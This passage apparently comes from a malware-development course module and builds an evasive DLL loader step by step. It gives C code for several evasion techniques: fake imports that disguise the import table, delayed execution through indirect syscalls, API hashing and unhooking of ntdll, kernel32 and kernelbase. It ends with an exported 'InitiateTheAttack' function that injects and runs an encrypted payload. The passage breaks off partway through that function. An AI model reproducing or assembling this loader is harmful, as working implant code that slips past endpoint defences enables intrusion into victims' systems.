</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h4 id="toc-heading-32">HashCalculator Project</h4>
<p>The shared code accompanying this module includes a project named <code>HashCalculator</code>,
 responsible for generating all the necessary hash values required for 
the complete implementation of API hashing within the loader. The image 
below provides an example of the output produced by the <code>HashCalculator</code> program.</p>
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-766503141-e3011cd4-6520-4071-bf75-e143d1314b02.png">
<h3 id="toc-heading-33">API Camouflage</h3>
<p>The concept of API camouflage, as introduced in <em>Module 80: IAT Camouflage</em>,
 is a technique used to enhance the obfuscation of the IAT. In this 
technique, non-malicious WinAPIs are incorporated into the code but are 
never actually invoked. This forces the compiler to include these 
WinAPIs in the IAT of the compiled implant, creating the appearance of a
 legitimate application.</p>
<p>When the <code>IatCamouflage</code> function below is invoked, the WinAPIs listed within it are added to the IAT of its implementation.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">
<span class="token comment">// Generate a random compile-time seed</span>
<span class="token keyword">int</span> <span class="token function">RandomCompileTimeSeed</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token char">'0'</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">40271</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">1</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">60</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">600</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">3600</span> <span class="token operator">+</span>
		<span class="token constant">__TIME__</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">36000</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// A dummy function that makes the if-statement in 'IatCamouflage' interesting for the compiler</span>
PVOID <span class="token function">Helper</span><span class="token punctuation">(</span>PVOID<span class="token operator">*</span> ppAddress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PVOID pAddress <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pAddress<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// setting the first 4 bytes in pAddress to be equal to a random number (less than 255)</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>pAddress <span class="token operator">=</span> <span class="token function">RandomCompileTimeSeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>

	<span class="token comment">// saving the base address by pointer </span>
	<span class="token operator">*</span>ppAddress <span class="token operator">=</span> pAddress<span class="token punctuation">;</span>

	<span class="token comment">// returning it </span>
	<span class="token keyword">return</span> pAddress<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// Function that imports WinAPIs but never uses them</span>
VOID <span class="token function">IatCamouflage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PVOID		pAddress	<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span><span class="token operator">*</span>		A			<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">Helper</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>pAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Impossible if-statement that will never run</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>A <span class="token operator">&gt;</span> <span class="token number">350</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token comment">// some random whitelisted WinAPIs</span>
		<span class="token keyword">unsigned</span> __int64 i <span class="token operator">=</span> <span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">SetCriticalSectionSpinCount</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">GetWindowContextHelpId</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">GetWindowLongPtrW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">RegisterClassW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">IsWindowVisible</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">ConvertDefaultLocale</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">MultiByteToWideChar</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		i <span class="token operator">=</span> <span class="token function">IsDialogMessageW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Freeing the buffer allocated in 'Helper'</span>
	<span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pAddress<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-34">Delaying Execution</h3>
<p>Delaying execution can help in bypassing virtualized environments, as mentioned in <em>Module 74: Anti-Virtual Environments - Multiple Delay Execution Techniques</em>. However, in our case, it also helps with the unhooking routine. When unhooking DLLs in the loader, having an <code>EXCEPTION_ACCESS_VIOLATION</code>
 exception raised is predictable, and thus handled. However, delaying 
the execution even for a short time before unhooking the target DLLs 
will give time for the current process to effectively execute its 
function calls without interception. This will lower the possibility of 
an exception being raised and thus create a more stable approach without
 triggering the VEH function that will use the RWX memory permission.</p>
<p>The loader will use the <code>NtDelayExecution</code> syscall function for execution delaying via the following <code>DelayExecution</code> function. <code>DelayExecution</code> requires one parameter, <code>fMinutes</code>, which represents the time in minutes for <code>NtDelayExecution</code> to delay. For example, if <code>fMinutes</code> was 0.1, <code>DelayExecution</code> would delay the execution for 6 seconds (60 * 0.1). It is worth noting that <code>NtDelayExecution</code> is called via the HellsHall syscaller, because it is called before the unhooking routine, and thus can be hooked.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">DelayExecution</span><span class="token punctuation">(</span>IN FLOAT fMinutes<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	NTSTATUS        STATUS          <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	DWORD           dwMilliSeconds  <span class="token operator">=</span> fMinutes <span class="token operator">*</span> <span class="token number">60000</span><span class="token punctuation">;</span>              <span class="token comment">// Converting minutes to milliseconds  </span>
	LONGLONG        Delay           <span class="token operator">=</span> dwMilliSeconds <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span>        <span class="token comment">// Converting from milliseconds to the 100-nanosecond negative time interval</span>
	LARGE_INTEGER   DelayInterval   <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span>QuadPart <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> Delay<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>

	<span class="token function">SET_SYSCALL</span><span class="token punctuation">(</span>g_Nt<span class="token punctuation">.</span>NtDelayExecution<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">NT_SUCCESS</span><span class="token punctuation">(</span>STATUS <span class="token operator">=</span> <span class="token function">RunSyscall</span><span class="token punctuation">(</span>FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DelayInterval<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> STATUS <span class="token operator">!=</span> STATUS_TIMEOUT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token comment">// failed.</span>
	<span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-35">Printing DLL's Debug Information</h3>
<p>Printing runtime messages from the DLL isn't as straightforward as EXE since it can't rely on the <code>printf</code>
 function alone. Depending on what type of process is loading the DLL 
(i.e. whether it's a console application or a GUI application), the 
behavior of <code>printf</code> differs. If the loading process is a console application, messages printed with <code>printf</code>
 will appear in the same console as the application. However, when 
dealing with a GUI application, understanding what the DLL is doing 
becomes challenging unless it's being debugged, which becomes even more 
complex.</p>
<p>To address this issue and enable runtime message printing from the loader, the following steps should be taken:</p>
<ol>
<li>
<p>Check if the process to which the DLL is attached contains a console using the <a href="https://learn.microsoft.com/en-us/windows/console/getconsolewindow" target="_blank">GetConsoleWindow</a> function. <code>GetConsoleWindow</code> returns a handle to the console of the calling process if it exists.</p>
</li>
<li>
<p>If the target process lacks a console, a new console will be created using the <a href="https://learn.microsoft.com/en-us/windows/console/allocconsole" target="_blank">AllocConsole</a> WinAPI.</p>
</li>
</ol>
<p>These steps are implemented in the <code>CreateDebugConsole</code> function below. Additionally, <code>CreateDebugConsole</code> ensures that a new console is only created once, which is due to the <code>g_bCreated</code> global variable that is initialized when <code>CreateDebugConsole</code> generates the initial console.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">BOOL g_bCreated <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>

VOID <span class="token function">CreateDebugConsole</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    
    <span class="token keyword">if</span> <span class="token punctuation">(</span>g_bCreated<span class="token punctuation">)</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetConsoleWindow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">AllocConsole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
        g_bCreated <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p><code>CreateDebugConsole</code> should be the first function called within the <code>DllMain</code> function of the loader. This ensures that a console is established early on to serve as the destination for output messages.</p>
<h4 id="toc-heading-36">Replacing Printf()</h4>
<p>With a console now available, the next step is to create a replacement for the <code>printf</code> function. The motivation behind this is that as the implementation progresses, the CRT library may be removed, resulting in <code>printf</code> not working anymore.</p>
<p>To address this, the provided <code>PRINT</code> macro is introduced, which uses the <a href="https://learn.microsoft.com/en-us/windows/console/getstdhandle" target="_blank">GetStdHandle</a> and <a href="https://learn.microsoft.com/en-us/windows/console/writeconsole" target="_blank">WriteConsoleA</a> WinAPIs to facilitate message writing to the process's console.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ERROR_BUF_SIZE</span>					<span class="token expression"><span class="token punctuation">(</span>MAX_PATH <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PRINT</span><span class="token expression"><span class="token punctuation">(</span> STR<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span>                                                                           </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                                                                        </span><span class="token punctuation">\</span>
        <span class="token expression">LPSTR cBuffer <span class="token operator">=</span> <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> ERROR_BUF_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>       </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token keyword">if</span> <span class="token punctuation">(</span>cBuffer<span class="token punctuation">)</span><span class="token punctuation">{</span>                                                                               </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token keyword">int</span> iLength <span class="token operator">=</span> <span class="token function">wsprintfA</span><span class="token punctuation">(</span>cBuffer<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> __VA_ARGS__<span class="token punctuation">)</span><span class="token punctuation">;</span>                                     </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">WriteConsoleA</span><span class="token punctuation">(</span><span class="token function">GetStdHandle</span><span class="token punctuation">(</span>STD_OUTPUT_HANDLE<span class="token punctuation">)</span><span class="token punctuation">,</span> cBuffer<span class="token punctuation">,</span> iLength<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           </span><span class="token punctuation">\</span>
            <span class="token expression"><span class="token function">HeapFree</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> cBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                                              </span><span class="token punctuation">\</span>
        <span class="token expression"><span class="token punctuation">}</span>                                                                                           </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token punctuation">}</span>  </span></span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<p>The majority of the <code>PRINT</code> macro calls utilize the following two macros:</p>
<ol>
<li><code>__FILE__</code> - This is a predefined compiler macro used to obtain the current source code file's path. Because <code>__FILE__</code> retrieves the entire file path, a new macro called <code>GET_FILENAME</code> is introduced to extract only the file's name from the path provided by <code>__FILE__</code>. The <code>GET_FILENAME</code> macro is defined as follows:</li>
</ol>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GET_FILENAME</span><span class="token expression"><span class="token punctuation">(</span>path<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> </span><span class="token char">'\\'</span><span class="token expression"><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> </span><span class="token char">'\\'</span><span class="token expression"><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> path<span class="token punctuation">)</span></span></span>
<span class="token comment">// Example usage: GET_FILENAME(__FILE__)</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<ol start="2">
<li><code>__LINE__</code> - Another predefined macro, <code>__LINE__</code>, serves to retrieve the current line number within a source code file.</li>
</ol>
<h4 id="toc-heading-37">Enabling Debug Mode</h4>
<p>The loader contains multiple <code>PRINT</code> calls throughout its functions for a verbose output. These <code>PRINT</code> calls will only be active if the <code>DEBUG</code> macro is defined, which is achieved through the <code>#define DEBUG</code> directive.</p>
<h3 id="toc-heading-38">DllMain Function</h3>
<p>The <code>DllMain</code> function serves as the initial point of execution when the DLL is loaded into a running process. The <code>DllMain</code> function in this loader is displayed below. It performs two main tasks: first, it calls the <code>CreateDebugConsole</code> function if debug mode is enabled, and second, it utilizes the <code>GetResourcePayload</code> function to retrieve details about the payload from the resource section.</p>
<p>Unhooking and payload injection procedures are carried out in a separate function, distinct from the <code>DllMain</code> function. This is due to the <a href="https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-best-practices" target="_blank">DLL load lock</a> problem, which will be explained in more detail in the upcoming module <em>Introduction To DLL Sideloading</em>. In short, the loader should not execute core functionality from <code>DllMain</code> and instead should be from an exported function.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> 	<span class="token macro-name">CTAES_PAYLOAD_ID</span>                 <span class="token expression"><span class="token number">0x5A</span>		</span><span class="token comment">// Set by the compiler when creating the .rc file </span></span>

PBYTE		g_pRsrcPayloadBuffer		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>		
DWORD		g_dwRsrcPayloadSize		<span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD dwReason<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">switch</span> <span class="token punctuation">(</span>dwReason<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span> <span class="token punctuation">{</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
		<span class="token function">CreateDebugConsole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetResourcePayload</span><span class="token punctuation">(</span>hModule<span class="token punctuation">,</span> CTAES_PAYLOAD_ID<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_pRsrcPayloadBuffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>g_dwRsrcPayloadSize<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
			<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Fetch The Payload From The Resource Section - %s.%d \n"</span><span class="token punctuation">,</span> <span class="token function">GET_FILENAME</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
			<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
	<span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
	<span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
		<span class="token keyword">break</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-39">InitiateTheAttack Function</h3>
<p>Recall that due to the DLL load lock issue, the primary function 
responsible for executing the core features of the loader will be from 
an exported function called <code>InitiateTheAttack</code>. This function carries out the following tasks:</p>
<ol>
<li>
<p>It verifies the success of the earlier execution of the <code>GetResourcePayload</code> function by checking the values of the global variables <code>g_pRsrcPayloadBuffer</code> and <code>g_dwRsrcPayloadSize</code>.</p>
</li>
<li>
<p>It invokes the <code>IatCamouflage</code> function to import fake functions and DLLs into the IAT.</p>
</li>
<li>
<p>It utilizes the <code>AddWin32uToIat</code> function to ensure that <code>shell32.dll</code> is imported. This is important because when <code>shell32.dll</code> is loaded, it loads <code>win32u.dll</code>, which contains the necessary <code>syscall</code> instructions.</p>
</li>
<li>
<p>It calls <code>InitIndirectSyscalls</code> to initialize the global <code>g_Nt</code> structure. As previously explained, this structure holds the essential components for making syscall calls via HellsHall.</p>
</li>
<li>
<p>The function introduces a delay in execution for a duration specified by the <code>g_NT_DELAY_TIME</code> variable, using the <code>DelayExecution</code> function.</p>
</li>
<li>
<p>It establishes a VEH function through <code>AddVectoredExceptionHandler</code>, resolved using API hashing with the help of <code>GetProcAddressH</code> and <code>GetModuleHandleH</code>.</p>
</li>
<li>
<p>The function proceeds to unhook the DLLs <code>ntdll.dll</code>, <code>kernel32.dll</code>, and <code>kernelbase.dll</code> by invoking <code>UnhookAllLoadedDlls</code>.</p>
</li>
<li>
<p>Afterward, it removes the VEH using <code>RemoveVectoredExceptionHandler</code>, once again resolved through API hashing with the aid of <code>GetProcAddressH</code> and <code>GetModuleHandleH</code>.</p>
</li>
<li>
<p>The payload is injected using the <code>InjectEncryptedPayload</code> function.</p>
</li>
<li>
<p>Finally, it executes the injected payload using the <code>ExecutePayload</code> function.</p>
</li>
</ol>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">NT_API		g_Nt                 <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> 
FLOAT		g_NT_DELAY_TIME      <span class="token operator">=</span> <span class="token number">0.3</span><span class="token punctuation">;</span>  <span class="token comment">// Delay execution for 0.3 minute</span>

<span class="token keyword">extern</span> <span class="token function">__declspec</span><span class="token punctuation">(</span>dllexport<span class="token punctuation">)</span> <span class="token keyword">int</span> <span class="token function">InitiateTheAttack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	PVOID		pVehHandler			<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
			    pInjectedPayload		<span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">// DllMain failed to fetch the payload</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_pRsrcPayloadBuffer <span class="token operator">||</span> <span class="token operator">!</span>g_dwRsrcPayloadSize<span class="token punctuation">)</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>

	<span class="token comment">// Add fake imports to the IAT</span>
	<span class="token function">IatCamouflage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Force win32u.dll to be loaded</span>
	<span class="token function">AddWin32uToIat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	fnAddVectoredExceptionHandler        pAddVectoredExceptionHandler     <span class="token operator">=</span> <span class="token punctuation">(</span>fnAddVectoredExceptionHandler<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> AddVectoredExceptionHandler_CRC32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	fnRemoveVectoredExceptionHandler     pRemoveVectoredExceptionHandler  <span class="token operator">=</span> <span class="token punctuation">(</span>fnRemoveVectoredExceptionHandler<span class="token punctuation">)</span><span class="token function">GetProcAddressH</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleH</span><span class="token punctuation">(</span>kernel32dll_CRC32<span class="token punctuation">)</span><span class="token punctuation">,</span> RemoveVectoredExceptionHandler_CRC32<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pAddVectoredExceptionHandler <span class="token operator">||</span> <span class="token operator">!</span>pRemoveVectoredExceptionHandler<span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
		<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[!] Failed To Fetch One Or More Function Pointers - %s.%d \n"</span><span class="token punctuation">,</span> <span class="token function">GET_FILENAME</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> </span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">// Initialize indirect syscalls structure</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitIndirectSyscalls</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>g_Nt<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DELAY</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
	<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[i] Delaying Execution For %d Seconds ... "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span><span class="token punctuation">(</span>g_NT_DELAY_TIME <span class="token operator">*</span> <span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
	<span class="token function">DelayExecution</span><span class="token punctuation">(</span>g_NT_DELAY_TIME<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
	<span class="token function">PRINT</span><span class="token punctuation">(</span><span class="token string">"[+] DONE \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// DELAY</span></span>

	<span class="token comment">// Start the VEH </span>
	pVehHandler <span class="token operator">=</span> <span class="token function">pAddVectoredExceptionHandler</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> VectoredExceptionHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pVehHandler <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">DEBUG</span></span>
